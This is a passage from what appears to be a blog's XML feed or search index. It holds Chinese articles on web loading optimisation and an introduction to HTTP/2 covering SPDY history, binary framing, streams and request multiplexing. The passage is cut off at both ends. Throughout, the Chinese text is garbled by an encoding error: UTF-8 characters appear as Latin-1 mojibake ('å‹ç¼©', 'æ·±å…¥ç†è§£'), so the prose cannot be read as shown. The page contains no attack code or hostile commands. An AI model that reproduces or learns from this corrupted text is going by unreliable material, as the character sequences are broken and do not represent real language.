å‹ç¼©å‹ç¼©å‹ç¼©ï¼Œhtmlï¼Œcssï¼Œjsï¼Œå›¾ç‰‡å‹ç¼© å‡çº§å‡çº§å‡çº§ï¼Œå‡çº§ HTTP/2 ä½¿ç”¨ CDN]]></content>
      <categories>
        <category>æ–‡ä»¶åŠ è½½é¡ºåº</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶åŠ è½½é¡ºåº</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£ http/2]]></title>
    <url>%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20http2%2F</url>
    <content type="text"><![CDATA[ä»¥ä¸‹å†…å®¹æ‘˜è‡ª HTTP/2 ç®€ä»‹ ï¼Œè¦äº†è§£æ›´å¤šè¯·ç§»æ­¥ ã€ŠWeb æ€§èƒ½æƒå¨æŒ‡å—ã€‹ï¼ˆOâ€™Reillyï¼Œä½œè€…ï¼šllya Grigorikï¼‰ è¿‘æ¥ HTTP/2 çš„å£°éŸ³ä¸æ–­åœ¨å›½å†…å„ä¸ªæŠ€æœ¯è®ºå›å“èµ·ï¼Œè¯´ä»€ä¹ˆ HTTP/2 å¯ä»¥å¸¦æ¥å¤šå°‘å¤šå°‘æ€§èƒ½æå‡ï¼Œåˆ°åº•æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿæˆ‘ä»¬ä¸€èµ·æ¥åˆ†æä¸€ä¸‹ã€‚ HTTP/2 ä¸»è¦ç‰¹æ€§åœ¨å¦‚ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š é€šè¿‡æ”¯æŒå®Œæ•´çš„è¯·æ±‚ä¸å“åº”å¤ç”¨æ¥å‡å°‘å»¶è¿Ÿ é€šè¿‡æœ‰æ•ˆå‹ç¼© HTTP æ ‡å¤´å­—æ®µï¼Œå°†åè®®å¼€é”€é™è‡³æœ€ä½ å¢åŠ è¯·æ±‚ä¼˜å…ˆçº§å’ŒæœåŠ¡å™¨æ¨é€çš„æ”¯æŒ æ³¨ï¼šä»¥ä¸Šæœºåˆ¶è™½ç„¶ä¸æ˜¯å…¨éƒ¨ï¼Œå´æ˜¯æœ€é‡è¦çš„ã€‚ è¯´åˆ°è¿™é‡Œï¼Œå„ä½çœ‹å®˜æ˜¯ä¸æ˜¯å·²ç»é¥æƒ³åˆ°å½“å¹´å‡çº§ HTTPSçš„è‹¦é€¼ç»å†äº†ï¼Ÿ ä¸å¿…æ‹…å¿ƒï¼ŒHTTP/2 æ²¡æœ‰æ”¹åŠ¨ HTTP çš„åº”ç”¨è¯­ä¹‰ã€‚HTTP æ–¹æ³•ã€çŠ¶æ€ä»£ç ã€URI å’Œæ ‡å¤´å­—æ®µç­‰æ ¸å¿ƒæ¦‚å¿µä¸€å¦‚å¾€å¸¸ã€‚ä¸è¿‡ï¼ŒHTTP/2 ä¿®æ”¹æ•°æ®æ ¼å¼åŒ–ï¼ˆåˆ†å¸§ï¼‰ä»¥åŠå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“æ–¹å¼ã€‚è¿™ä¸¤ç‚¹ç»Ÿå¸…å…¨å±€ã€‚é€šè¿‡æ–°çš„åˆ†å¸§å±‚ï¼Œå‘æˆ‘ä»¬çš„åº”ç”¨éšè—äº†æ‰€æœ‰çš„å¤æ‚æ€§ã€‚å› æ­¤æ‰€æœ‰ç°æœ‰åº”ç”¨éƒ½å¯ä»¥ä¸å¿…ä¿®æ”¹è€Œåœ¨æ–°åè®®ä¸‹è¿è¡Œã€‚ é™¤éæ‚¨åœ¨å®ç°ç½‘ç»œæœåŠ¡å™¨ï¼ˆæˆ–è‡ªå®šä¹‰å®¢æˆ·ç«¯ï¼‰ï¼Œéœ€è¦ä½¿ç”¨åŸå§‹çš„ TCP å¥—æ¥å­—ï¼Œå¦åˆ™ä½ å¯èƒ½æ³¨æ„ä¸åˆ°ä»»ä½•åŒºåˆ«ï¼šæ‰€æœ‰æ–°çš„ä½çº§åˆ†å¸§ç”±å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸ºæ‚¨å®Œæˆã€‚å¯è§‚å¯Ÿåˆ°çš„å”¯ä¸€åŒºåˆ«å°†æ˜¯æ€§èƒ½çš„æå‡å’Œè¯·æ±‚ä¼˜å…ˆçº§ã€æµæ§åˆ¶å’ŒæœåŠ¡å™¨æ¨é€ç­‰æ–°åŠŸèƒ½çš„å‡ºç°ã€‚ æ˜¯ä¸æ˜¯å¾ˆçˆ½ï¼ŸğŸ˜Š äººå®¶å¸¦ç»™ä½ è¿™ä¹ˆå¤šå¥½å¤„ï¼Œæ€»å¾—çŸ¥é“ä¸‹äººå®¶æ¥è‡ªå“ªé‡Œå§ï¼Ÿç¤¼å°šå¾€æ¥å˜›ï¼Œè¯·çœ‹ SPDY ä¸ HTTP/2 ç®€å² SPDY æ˜¯ Google å¼€å‘çš„ä¸€ä¸ªå®éªŒæ€§åè®®ï¼Œäº 2009 å¹´å¹´ä¸­å‘å¸ƒï¼Œå…¶ä¸»è¦ç›®æ ‡æ˜¯é€šè¿‡è§£å†³ HTTP/1.1 ä¸­å¹¿ä¸ºäººçŸ¥çš„ä¸€äº›æ€§èƒ½é™åˆ¶æ¥å‡å°‘ç½‘é¡µçš„åŠ è½½å»¶è¿Ÿã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªé¡¹ç›®è®¾å®šçš„ç›®æ ‡å¦‚ä¸‹ï¼š é¡µé¢åŠ è½½æ—¶é—´ï¼ˆPLTï¼‰å‡å°‘ 50% æ— éœ€ç½‘é¡µä½œè€…æ”¹ä»»ä½•å†…å®¹ å°†éƒ¨ç½²å¤æ‚æ€§é™è‡³æœ€ä½ï¼Œæ— éœ€æ›´æ”¹ç½‘ç»œåŸºç¡€è®¾æ–½ ä¸å¼€æºç¤¾åŒºåˆä½œå¼€å‘è¿™ä¸ªæ–°åè®® æ”¶é›†çœŸå®æ•°æ®ï¼ŒéªŒè¯è¿™ä¸ªå®éªŒæ€§åè®®æ˜¯å¦æœ‰æ•ˆ æ³¨ï¼šä¸ºäº†è¾¾åˆ°å‡å°‘ 50% é¡µé¢åŠ è½½æ—¶é—´çš„ç›®æ ‡ï¼ŒSPDY å¼•å…¥äº†ä¸€ä¸ªæ–°çš„äºŒè¿›åˆ¶åˆ†å¸§å±‚ï¼Œä»¥å®ç°è¯·æ±‚å’Œå“åº”å¤ç”¨ã€ä¼˜å…ˆçº§å’Œæ ‡å¤´å‹ç¼©ï¼Œç›®çš„æ˜¯æ›´æœ‰æ•ˆçš„åˆ©ç”¨åº•å±‚ TCP è¿æ¥ã€‚TCP çš„ä¸‰æ¬¡æ¡æ‰‹å’Œæ…¢å¯åŠ¨ç­‰å¸¦æ¥çš„å»¶æ—¶æ€§èƒ½é—®é¢˜ï¼Œè¯·å‚é˜…å»¶è¿Ÿæ˜¯æ€§èƒ½ç“¶é¢ˆ é¦–æ¬¡å‘å¸ƒåä¸ä¹…ï¼ŒGoogle ä¸¤ä½è½¯ä»¶å·¥ç¨‹å¸ˆ Mike Belshe å’Œ Roberto Peon å°±åˆ†äº«äº†ä»–ä»¬å¯¹è¿™ä¸ªå®éªŒæ€§ SPDY åè®®çš„å®ç°ç»“æœã€æ–‡æ¡£å’Œæºä»£ç ã€‚ ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªåœ¨å®éªŒæ¡ä»¶ä¸‹æµ‹è¯•è¿‡ SPDY ã€‚&gt; æœ€åˆçš„ç»“æœå¾ˆæ¿€åŠ¨äººå¿ƒï¼šé€šè¿‡æ¨¡æ‹Ÿçš„å®¶åº­ç½‘ç»œè¿æ¥ä¸‹è½½äº† 25 ä¸ªæœ€æµè¡Œçš„ç½‘ç«™ä¹‹åï¼Œæˆ‘ä»¬å‘ç°æ€§èƒ½æå‡ç‰¹åˆ«æ˜æ˜¾ï¼Œé¡µé¢åŠ è½½é€Ÿåº¦æœ€é«˜åŠ å¿«äº† 55% ï¼Œï¼ˆChromium åšå®¢ï¼‰ å‡ å¹´åçš„ 2012 å¹´ï¼Œè¿™ä¸ªæ–°çš„åè®®å¾—åˆ°äº† Chromeã€Firefoxã€Opera çš„æ”¯æŒï¼Œè¶Šæ¥è¶Šå¤šçš„å¤§å‹ç½‘ç«™ï¼ˆå¦‚ Googleã€Twitterã€Facebookï¼‰å’Œå°å‹ç½‘ç«™å¼€å§‹åœ¨å…¶åŸºç¡€è®¾æ–½å†…éƒ¨ç½² SPDYã€‚äº‹å®ä¸Šï¼Œåœ¨è¢«è¡Œä¸šè¶Šæ¥è¶Šå¤šçš„é‡‡ç”¨ä¹‹åï¼ŒSPDY å·²ç»å…·å¤‡äº†æˆä¸ºæ ‡å‡†çš„æ¡ä»¶ã€‚ è§‚å¯Ÿåˆ°è¿™ä¸€è¶‹åŠ¿åï¼ŒHTTP å·¥ä½œç»„ï¼ˆHTTP-WGï¼‰å°†è¿™ä¸€å·¥ä½œæä¸Šè®®äº‹æ—¥ç¨‹ï¼Œå¸å– SPDY çš„ç»éªŒæ•™è®­ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šå®šåˆ¶äº†å®˜æ–¹â€œHTTP/2â€æ ‡å‡†ã€‚åœ¨æ‹Ÿå®šå®£è¨€è‰æ¡ˆã€å‘ç¤¾ä¼šå¾é›† HTTP/2 å»ºè®®å¹¶ç»è¿‡å†…éƒ¨è®¨è®ºä¹‹åï¼ŒHTTP-WG å†³å®šå°† SPDY è§„èŒƒä½œä¸ºæ–° HTTP/2 åè®®çš„åŸºç¡€ã€‚ æ¥ä¸‹æ¥å‡ å¹´ä¸­ SPDY å’Œ HTTP/2 æŒç»­å…±åŒè¿›åŒ–ï¼ŒSPDY ä½œä¸ºå®éªŒæ€§åˆ†æ”¯ï¼Œç”¨äºä¸º HTTP/2 æ ‡å‡†æµ‹è¯•æ–°åŠŸèƒ½å’Œå»ºè®®ã€‚ç†è®ºä¸ä¸€å®šé€‚åˆå®è·µï¼ˆåä¹‹äº¦ç„¶ï¼‰ï¼ŒSPDY æä¾›äº†ä¸€ä¸ªæµ‹è¯•å’Œè¯„ä¼°è·¯çº¿ï¼Œå¯ä»¥å¯¹è¦åŒ…æ‹¬åˆ° HTTP/2 æ ‡å‡†ä¸­çš„æ¯æ¡å»ºè®®è¿›è¡Œæµ‹è¯•å’Œè¯„ä¼°ã€‚æœ€ç»ˆï¼Œè¿™ä¸ªè¿‡ç¨‹æŒç»­äº†ä¸‰å¹´ï¼ŒæœŸé—´äº§ç”Ÿäº† 10 ä½™æ¡ä¸­é—´è‰æ¡ˆï¼š 2012 å¹´ 3 æœˆï¼šå¾é›† HTTP/2 å»ºè®® 2012 å¹´ 11 æœˆï¼šç¬¬ä¸€ä¸ª HTTP/2 è‰æ¡ˆï¼ˆåŸºäº SPDYï¼‰ 2014 å¹´ 8 æœˆï¼šHTTP/2 è‰æ¡ˆ 17 å’Œ HPACK è‰æ¡ˆ 12 å‘å¸ƒ 2014 å¹´ 8 æœˆï¼šå·¥ä½œç»„æœ€åä¸€æ¬¡å¾é›† HTTP/2 å»ºè®® 2015 å¹´ 2 æœˆï¼šIESG æ‰¹å‡† HTTP/2 å’Œ HPACK è‰æ¡ˆ 2015 å¹´ 5 æœˆï¼šRFC 7540 (HTTP/2) å’Œ RFC 7541 (HPACk) å‘å¸ƒ 2015 å¹´åˆï¼ŒIESG å®¡é˜…äº†æ–°çš„ HTTP/2 æ ‡å‡†å¹¶æ‰¹å‡†å‘å¸ƒã€‚ä¹‹åä¸ä¹…ï¼ŒGoogle Chrome å›¢é˜Ÿå…¬å¸ƒäº†ä»–ä»¬ä¸º TLS å¼ƒç”¨ SPDY å’Œ NPN æ‰©å±•çš„æ—¶é—´è¡¨ï¼š ä¸ HTTP/1.1 ç›¸æ¯”ï¼ŒHTTP/2 çš„ä¸»è¦å˜åŒ–åœ¨äºæ€§èƒ½æå‡ã€‚&gt; ä¸€äº›ä¸»è¦åŠŸèƒ½ï¼ˆä¾‹å¦‚å¤ç”¨ã€æ ‡å¤´å‹ç¼©ã€åè®®åå•†å’Œä¼˜å…ˆçº§ï¼‰æ¼”åŒ–è‡ªä¹‹å‰å¼€æ”¾ä½†ä¸æ ‡å‡†çš„åè®® SPDYã€‚Chrome è‡ª Chrome 6 å°±å¼€å§‹æ”¯æŒ SPDYï¼Œä½†ç”±äºå¤§éƒ¨åˆ†ä¼˜ç‚¹éƒ½é›†ä¸­åœ¨ HTTP/2 Ë™ä¸­ï¼Œæ˜¯æ—¶å€™å‘ SPDY è¯´å†è§äº†ã€‚æˆ‘ä»¬è®¡åˆ’äº 2016 å¹´åˆåœæ­¢å¯¹ SPDY çš„æ”¯æŒï¼Œè¿˜ä¼šåœæ­¢ TLS çš„ NPN æ‰©å±•çš„æ”¯æŒï¼Œè½¬è€Œåœ¨ Chrome ä¸­ä½¿ç”¨ ALPNã€‚å¼ºçƒˆå»ºè®®æœåŠ¡å™¨å¼€å‘è€…è¿ç§»è‡³ HTTP/2 å’Œ ALPNã€‚æˆ‘ä»¬å¾ˆé«˜å…´å‚ä¸åˆ°æœ€ç»ˆå‚¬ç”Ÿäº† HTTP/2 çš„å¼€æ”¾å¼æ ‡å‡†å®šåˆ¶è¿‡ç¨‹ï¼Œå¹¶ä¸”è€ƒè™‘åˆ°æ•´ä¸ªè¡Œä¸šåœ¨æ ‡å‡†åŒ–å’Œå®ç°è¿‡ç¨‹ä¸­çš„å‚ä¸çƒ­æƒ…ï¼Œæˆ‘ä»¬å¸Œæœ›å¯¹è¿™æ ‡å‡†çš„é‡‡çº³è¶Šæ¥è¶Šå¤šã€‚ï¼ˆChromium åšå®¢ï¼‰ SPDY ä¸ HTTP/2 çš„å…±åŒæ¼”åŒ–è®©æœåŠ¡å™¨ã€æµè§ˆå™¨å’Œç½‘ç«™å¼€å‘è€…å¯ä»¥åœ¨åè®®çš„å®šåˆ¶è¿‡ç¨‹ä¸­è·å¾—çœŸå®ä½“éªŒã€‚å› æ­¤ï¼ŒHTTP/2 åè®®è‡ªè¯ç”Ÿä¹‹æ—¥èµ·å°±æˆä¸ºæœ€å¥½å¹¶ç»è¿‡å¤§é‡æµ‹è¯•çš„æ ‡å‡†ä¹‹ä¸€ã€‚åˆ° HTTP/2 è¢« IESG æ‰¹å‡†æ—¶ï¼Œå·²ç»æœ‰å¾ˆå¤šç»è¿‡å®Œå…¨æµ‹è¯•å¹¶ä¸”å¯ä»¥ç«‹å³æŠ•å…¥ç”Ÿäº§çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ã€‚äº‹å®ä¸Šï¼Œåœ¨æœ€ç»ˆåè®®è¢«æ‰¹å‡†çš„å‡ å‘¨åï¼Œç”±äºå¤šæ¬¾çƒ­é—¨æµè§ˆå™¨ï¼ˆå’Œè®¸å¤šç½‘ç«™ï¼‰éƒ½éƒ¨ç½²äº†å®Œæ•´çš„ HTTP/2 æ”¯æŒï¼Œå¤§é‡ç”¨æˆ·éƒ½ä½“ä¼šåˆ°äº†æ–°åè®®çš„å¥½å¤„ã€‚ è®¾è®¡å’ŒæŠ€æœ¯ç›®æ ‡ æ—©æœŸç‰ˆæœ¬ HTTP åè®®çš„è®¾è®¡åˆè¡·ä¸»è¦æ˜¯å®ç°ç®€å•ï¼šHTTP/0.9 åªç”¨ä¸€è¡Œä»£ç å°±å¯åŠ¨äº†ä¸‡ç»´ç½‘ï¼›HTTP/1.0 åˆ™æ˜¯å¯¹æµè¡Œçš„ HTTP/0.9 æ‰©å±•çš„ä¸€ä¸ªæ­£å¼è¯´æ˜ï¼›HTTP/1.1 åˆ™æ˜¯ IETF çš„ä¸€ä»½å®˜æ–¹æ ‡å‡†ã€‚å› æ­¤ï¼ŒHTTP/0.9-1.x åªæè¿°äº†ç°å®æ˜¯è¿™ä¹ˆä¸€å›äº‹ï¼šHTTP æ˜¯åº”ç”¨æœ€å¹¿æ³›ã€é‡‡ç”¨æœ€å¤šçš„ä¸€ä¸ªäº’è”ç½‘åº”ç”¨åè®®ã€‚ ç„¶è€Œï¼Œç®€å•æ˜¯ä»¥ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·çš„ï¼šHTTP/1.x éœ€è¦å¤šä¸ªè¿æ¥æ‰èƒ½å®ç°å¹¶å‘å’Œç¼©çŸ­å»¶è¿Ÿï¼ŒHTTP/1.x ä¸ä¼šå‹ç¼©è¯·æ±‚å’Œå“åº”æ ‡å¤´ï¼Œä»è€Œå¯¼è‡´ä¸å¿…è¦çš„ç½‘ç»œæµé‡ï¼›HTTP/1.x ä¸æ”¯æŒæœ‰æ•ˆçš„èµ„æºä¼˜å…ˆçº§ï¼Œå¯¼è‡´åº•å±‚ TCP åè®®åˆ©ç”¨ç‡ä½ä¸‹ï¼Œç­‰ç­‰ã€‚ è¿™äº›é™åˆ¶å¹¶ä¸æ˜¯è‡´å‘½çš„ï¼Œä½†æ˜¯éšç€äº’è”ç½‘åº”ç”¨çš„èŒƒå›´ã€å¤æ‚æ€§ä»¥åŠåœ¨æˆ‘ä»¬ç”Ÿæ´»ä¸­çš„é‡è¦æ€§ä¸æ–­å¢å¤§ï¼Œå®ƒä»¬å¯¹ç½‘ç»œå¼€å‘è€…å’Œç”¨æˆ·éƒ½é€ æˆäº†å·¨å¤§è´Ÿæ‹…ï¼Œè€Œè¿™æ­£æ˜¯ HTTP/2 è‡´åŠ›äºè§£å†³çš„ï¼š HTTP/2 é€šè¿‡æ”¯æŒæ ‡å¤´å­—æ®µå‹ç¼©å’Œåœ¨åŒä¸€ä¸ªè¿æ¥ä¸Šè¿›è¡Œå¤šä¸ªå¹¶å‘äº¤æ¢ï¼Œè®©åº”ç”¨æœ‰æ•ˆåœ°åˆ©ç”¨ç½‘ç»œèµ„æºï¼Œå‡å°‘æ„ŸçŸ¥çš„å»¶è¿Ÿæ—¶é—´ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒå¯ä»¥å¯¹åŒä¸€è¿æ¥ä¸Šçš„è¯·æ±‚å’Œå“åº”æ¶ˆæ¯è¿›è¡Œäº¤é”™å‘é€å¹¶ä¸º HTTP æ ‡å¤´å­—æ®µä½¿ç”¨æœ‰æ•ˆç¼–ç ã€‚HTTP/2 è¿˜å…è®¸ä¸ºè¯·æ±‚è®¾ç½®ä¼˜å…ˆçº§ï¼Œè®©æ›´é‡è¦çš„è¯·æ±‚æ›´å¿«é€Ÿåœ°å®Œæˆï¼Œä»è€Œè¿›ä¸€æ­¥æå‡æ€§èƒ½ã€‚å‡ºå°çš„åè®®å¯¹ç½‘ç»œæ›´åŠ å‹å¥½ï¼Œå› ä¸ºä¸ HTTP/1.x ç›¸æ¯”ï¼Œå¯ä»¥ä½¿ç”¨æ›´å°‘çš„ TCP è¿æ¥ã€‚ è¿™æ„å‘³ç€ä¸å…¶ä»–æµçš„ç«äº‰å‡å°ï¼Œå¹¶ä¸”è¿æ¥æŒç»­æ—¶é—´å˜é•¿ï¼Œè¿™äº›ç‰¹æ€§åè¿‡æ¥æé«˜äº†å¯ç”¨ç½‘ç»œå®¹é‡çš„åˆ©ç”¨ç‡ã€‚æœ€åï¼ŒHTTP/2 è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨äºŒè¿›åˆ¶æ¶ˆæ¯åˆ†å¸§å¯¹æ¶ˆæ¯è¿›è¡Œæ›´é«˜æ•ˆçš„å¤„ç†ã€‚ï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ç‰ˆæœ¬ 2ï¼Œè‰æ¡ˆ 17ï¼‰ äºŒè¿›åˆ¶åˆ†å¸§å±‚ HTTP/2 æ‰€æœ‰æ€§èƒ½å¢å¼ºçš„æ ¸å¿ƒåœ¨äºæ–°çš„äºŒè¿›åˆ¶åˆ†å¸§å±‚ï¼Œå®ƒå®šä¹‰äº†å¦‚ä½•å°è£… HTTP æ¶ˆæ¯å¹¶åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“ã€‚ è¿™é‡Œæ‰€è°“çš„â€œå±‚â€ï¼ŒæŒ‡çš„æ˜¯ä½äºå¥—æ¥å­—æ¥å£ä¸åº”ç”¨å¯è§çš„é«˜çº§ HTTP API ä¹‹é—´ä¸€ä¸ªç»è¿‡ä¼˜åŒ–çš„æ–°ç¼–ç æœºåˆ¶ï¼šHTTP çš„è¯­ä¹‰ï¼ˆåŒ…æ‹¬å„ç§åŠ¨è¯ã€æ–¹æ³•ã€æ ‡å¤´ï¼‰éƒ½ä¸å—å½±å“ï¼Œä¸åŒçš„æ˜¯ä¼ è¾“æœŸé—´å¯¹å®ƒä»¬çš„ç¼–ç æ–¹å¼å˜äº†ã€‚HTTP/1.x ä»¥æ¢è¡Œç¬¦ä½œä¸ºçº¯æ–‡æœ¬çš„åˆ†éš”ç¬¦ï¼Œè€Œ HTTP/2 å°†æ‰€æœ‰ä¼ è¾“çš„æ¶ˆæ¯åˆ†å‰²ä¸ºæ›´å°çš„æ¶ˆæ¯å’Œå¸§ï¼Œå¹¶é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼å¯¹å®ƒä»¬ç¼–ç ã€‚ è¿™æ ·ä¸€æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸ºäº†äº’ç›¸ç†è§£ï¼Œéƒ½å¿…é¡»ä½¿ç”¨æ–°çš„äºŒè¿›åˆ¶ç¼–ç æœºåˆ¶ï¼šHTTP/1.x å®¢æˆ·ç«¯æ— æ³•ç†è§£åªæ”¯æŒ HTTP/2 çš„æœåŠ¡å™¨ï¼Œåä¹‹äº¦ç„¶ã€‚ä¸è¿‡ä¸è¦ç´§ï¼Œç°æœ‰çš„åº”ç”¨ä¸å¿…æ‹…å¿ƒè¿™äº›å˜åŒ–ï¼Œå› ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½ä¼šæ›¿æˆ‘ä»¬å®Œæˆå¿…è¦çš„åˆ†å¸§å·¥ä½œã€‚ æ•°æ®æµã€æ¶ˆæ¯å’Œå¸§ æ–°çš„äºŒè¿›åˆ¶æœºåˆ¶æ”¹å˜äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´äº¤æ¢æ•°æ®çš„æ–¹å¼ã€‚ä¸ºäº†è¯´æ˜è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ HTTP/2 çš„ä¸‰ä¸ªæ¦‚å¿µï¼š æ•°æ®æµï¼šå·²å»ºç«‹çš„è¿æ¥å†…çš„åŒå‘å­—èŠ‚æµï¼Œå¯ä»¥æ‰¿è½½ä¸€æ¡æˆ–å¤šæ¡ä¿¡æ¯ æ¶ˆæ¯ï¼šä¸é€»è¾‘è¯·æ±‚æˆ–å“åº”æ¶ˆæ¯å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—å¸§ å¸§ï¼šHTTP/2 é€šä¿¡çš„æœ€å°å•ä½ï¼Œæ¯ä¸ªå¸§éƒ½åŒ…æ‹¬å¸§å¤´ï¼Œè‡³å°‘ä¹Ÿä¼šæ ‡è¯†å‡ºå½“å‰å¸§æ‰€å±çš„æ•°æ®æµã€‚ è¿™äº›æ¦‚å¿µçš„å…³ç³»æ€»ç»“å¦‚ä¸‹ï¼š æ‰€æœ‰é€šä¿¡éƒ½åœ¨ä¸€ä¸ª TCP è¿æ¥ä¸Šå®Œæˆï¼Œæ­¤è¿æ¥å¯ä»¥æ‰¿è½½ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµ æ¯ä¸ªæ•°æ®æµéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºæ‰¿è½½åŒå‘æ¶ˆæ¯ æ¯æ¡æ¶ˆæ¯éƒ½æ˜¯ä¸€æ¡é€»è¾‘ HTTP æ¶ˆæ¯ï¼ˆä¾‹å¦‚è¯·æ±‚æˆ–å“åº”ï¼‰ï¼ŒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå¸§ å¸§æ˜¯æœ€å°çš„é€šä¿¡å•ä½ï¼Œæ‰¿è½½ç€ç‰¹å®šç±»å‹çš„æ•°æ®ï¼Œä¾‹å¦‚ HTTP æ ‡å¤´ã€æ¶ˆæ¯è´Ÿè½½ï¼Œç­‰ç­‰ã€‚æ¥è‡ªä¸åŒæ•°æ®æµçš„å¸§å¯ä»¥äº¤é”™å‘é€ï¼Œç„¶ååœ¨æ ¹æ®æ¯ä¸ªå¸§å¤´çš„æ•°æ®æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£… ç®€è¨€ä¹‹ï¼ŒHTTP/2 å°† HTTP åè®®é€šä¿¡åˆ†è§£ä¸ºäºŒè¿›åˆ¶ç¼–ç å¸§çš„äº¤æ¢ï¼Œè¿™äº›å¸§å¯¹åº”ç€ç‰¹å®šæ•°æ®æµä¸­çš„æ¶ˆæ¯ã€‚æ‰€æœ‰è¿™äº›éƒ½åœ¨ä¸€ä¸ª TCP è¿æ¥å†…å¤ç”¨ã€‚è¿™æ˜¯ HTTP/2 åè®®æ‰€æœ‰å…¶ä»–åŠŸèƒ½å’Œæ€§èƒ½ä¼˜åŒ–çš„åŸºç¡€ã€‚ è¯·æ±‚ä¸å“åº”å¤ç”¨ åœ¨ HTTP/1.x ä¸­ï¼Œå¦‚æœå®¢æˆ·ç«¯æƒ³è¦å‘èµ·å¤šä¸ªå¹¶è¡Œè¯·æ±‚ä»¥æå‡æ€§èƒ½ï¼Œåˆ™å¿…é¡»ä½¿ç”¨å¤šä¸ª TCP è¿æ¥ï¼ˆè¯·å‚é˜…ä½¿ç”¨å¤šä¸ª TCP è¿æ¥ï¼‰ã€‚è¿™æ˜¯ HTTP/1.x äº¤äº’æ¨¡å‹çš„ç»“æœï¼Œè¯¥æ¨¡å‹å¯ä»¥ä¿è¯æ¯ä¸ªè¿æ¥æ¯æ¬¡åªäº¤ä»˜ä¸€ä¸ªå“åº”ï¼ˆå“åº”æ’é˜Ÿï¼‰ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œè¿™ç§æ¨¡å‹ä¹Ÿä¼šå¯¼è‡´é˜Ÿé¦–é˜»å¡ï¼Œä»è€Œé€ æˆåº•å±‚ TCP è¿æ¥æ•ˆç‡ä½ä¸‹ã€‚ HTTP/2 ä¸­æ–°çš„äºŒè¿›åˆ¶åˆ†å¸§å±‚çªç ´äº†è¿™äº›é™åˆ¶ï¼Œå®ç°äº†å®Œæ•´çš„è¯·æ±‚å’Œå“åº”å¤ç”¨ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥å°† HTTP æ¶ˆæ¯åˆ†è§£ä¸ºäº’ä¸ä¾èµ–çš„å¸§ï¼Œç„¶åäº¤é”™å‘é€ï¼Œæœ€ååœ¨å¦ä¸€ç«¯æŠŠå®ƒä»¬é‡æ–°ç»„è£…èµ·æ¥ã€‚ HTTP/1.x å’Œ HTTP/2 çš„æ•°æ®ä¼ è¾“è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¿«ç…§æ•æ‰äº†ä¸€ä¸ªè¿æ¥å†…å¹¶è¡Œçš„å¤šä¸ªæ•°æ®æµã€‚å®¢æˆ·ç«¯æ­£å‘æœåŠ¡å™¨ä¼ é€ä¸€ä¸ª DATA å¸§ï¼ˆæ•°æ®æµ5ï¼‰ï¼Œä¸æ­¤åŒæ—¶ï¼ŒæœåŠ¡å™¨æ­£å‘å®¢æˆ·ç«¯å‘é€æ•°æ®æµ1å’Œæ•°æ®æµ3çš„ä¸€ç³»åˆ—å¸§ã€‚å› æ­¤ä¸€ä¸ªè¿æ¥ä¸ŠåŒæ—¶æœ‰ä¸‰ä¸ªå¹¶è¡Œçš„æ•°æ®æµã€‚ å°† HTTP æ¶ˆæ¯åˆ†è§£ä¸ºç‹¬ç«‹çš„å¸§ï¼Œäº¤é”™å‘é€ï¼Œç„¶ååœ¨å¦å¤–ä¸€ç«¯é‡æ–°ç»„è£…æ˜¯ HTTP/2 æœ€é‡è¦çš„ä¸€é¡¹å¢å¼ºã€‚äº‹å®ä¸Šï¼Œè¿™ä¸ªæœºåˆ¶ä¼šåœ¨æ•´ä¸ªç½‘ç»œæŠ€æœ¯æ ˆä¸­å¼•å‘ä¸€ç³»åˆ—çš„è¿é”ååº”ï¼Œä»è€Œå¸¦æ¥å·¨å¤§çš„æ€§èƒ½æå‡ï¼Œè®©æˆ‘ä»¬å¯ä»¥ï¼š å¹¶è¡Œäº¤é”™å‘é€å¤šä¸ªè¯·æ±‚ï¼Œè¯·æ±‚ä¹‹é—´ä¸å½±å“ å¹¶è¡Œäº¤é”™å‘é€å¤šä¸ªå“åº”ï¼Œå“åº”ä¹‹é—´ä¸å½±å“ ä½¿ç”¨ä¸€ä¸ªè¿æ¥å¹¶è¡Œå‘é€å¤šä¸ªè¯·æ±‚å’Œå“åº” ä¸å¿…å†ä¸ºç»•è¿‡ HTTP/1.x é™åˆ¶è€Œåšå¾ˆå¤šå·¥ä½œ æ¶ˆé™¤ä¸å¿…è¦çš„å»¶è¿Ÿå’Œæé«˜ç°æœ‰ç½‘ç»œå®¹é‡çš„åˆ©ç”¨ç‡ï¼Œä»è€Œå‡å°‘é¡µé¢åŠ è½½æ—¶é—´ ç­‰ç­‰â€¦. HTTP/2 ä¸­æ–°çš„äºŒè¿›åˆ¶åˆ†å¸§å±‚è§£å†³äº† HTTP/1.x 